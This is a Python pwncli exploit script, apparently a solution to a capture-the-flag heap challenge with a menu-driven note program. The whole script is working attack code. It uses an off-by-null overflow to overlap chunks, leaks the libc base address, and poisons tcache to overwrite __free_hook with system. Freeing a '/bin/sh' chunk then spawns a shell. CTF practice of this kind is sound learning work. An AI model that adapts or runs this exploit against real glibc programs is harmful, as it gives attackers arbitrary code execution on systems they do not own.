#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(length:int, data="a\n"):
    assert length <= 0x400
    p.sendlineafter(">>", "1")
    p.sendlineafter("len:", str(length))
    p.sendafter("content:", data)


def show(idx):
    p.sendlineafter(">>", "2")
    p.sendlineafter("idx:", str(idx))
    m = p.recvline()
    info(f"Get msg: {m}")
    return m

def dele(idx):
    p.sendlineafter(">>", "3")
    p.sendlineafter("idx:", str(idx))

def merge(id1, id2):
    p.sendlineafter(">>", "4")
    p.sendlineafter("idx1:", str(id1))
    p.sendlineafter("idx2:", str(id2))


def bye():
    p.sendlineafter(">>", "5")


"""
1. off by null 
"""

add(0x400) # 0
add(0xf0, 0xf0*"a") # 1
add(0x8, 0x8*"a") # 2
merge(0, 1) # 3 # 0x500
add(0xf8) # 4
merge(0, 1) # 5 0x500
add(0x10) # 6 gap

# free to get unsortedbin chunk
dele(3)
dele(4)

# off by null
merge(1, 2) # 3

dele(3)
add(0xf8, b"a"*0xf0+p64(0x600)) # 3
dele(5)

add(0x3f0) # 4
add(0xf0) # 5
m = show(3)
libc_abse_addr = u64_ex(m[:-1]) - 0x3ebca0
log_libc_base_addr(libc_abse_addr)
libc.address = libc_abse_addr

add(0xf0) # 7 overlapped with 3

dele(3)
dele(7)

add(0xf0, p64(libc.sym['__free_hook'])+b"\n") # 3
add(0xf0, "/bin/sh\x00\n") # 7
add(0xf0, p64(libc.sym['system'])+b"\n")

dele(7)

get_flag_when_get_shell(p)


p.interactive()